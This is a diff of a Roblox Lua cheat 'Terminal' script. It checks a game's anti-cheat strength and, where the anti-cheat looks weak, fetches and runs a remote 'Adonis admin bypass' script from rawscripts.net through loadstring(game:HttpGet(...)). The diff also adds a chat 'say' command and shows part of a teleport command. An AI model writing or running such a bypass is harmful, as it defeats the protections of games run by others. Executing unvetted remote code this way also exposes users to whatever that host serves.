@@ -61,16 +61,14 @@ end
 
 local function runAdonisBypassIfSafe()
     if isStrongAntiCheat() then
-        warn("[Terminal] Strong anti-cheat detected. Skipping bypass script.")
+        warn("[Terminal] Strong anti-cheat detected. Cancelling the bypass.")
         return false
     end
 
     -- SAFE TO RUN CLIENT-SIDE LOCAL BYPASS
-    loadstring(game:HttpGet(
-        "https://rawscripts.net/raw/Universal-Script-adonis-admin-bypass-19375"
-    ))()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-adonis-admin-bypass-19375"))()
 
-    warn("[Terminal] Weak AC detected, bypass script loaded.")
+    warn("[Terminal] Weak AC detected, bypassing the remaining anti-cheat...")
     return true
 end
 
@@ -289,6 +287,19 @@ commands.jp = function(args)
     end
 end
 
+commands.say = function(args)
+    local message = table.concat(args, " ")
+    if message == "" then
+        return false, "Usage: say {text}"
+    end
+
+    local TextChatService = game:GetService("TextChatService")
+
+    -- Uses Roblox's official chat API
+    TextChatService.TextChannels.RBXGeneral:SendAsync(message)
+
+    return true, "Sent: " .. message
+end
 
 -- 1. GOTO (Teleport to a player)
 -- Usage: goto [playername]
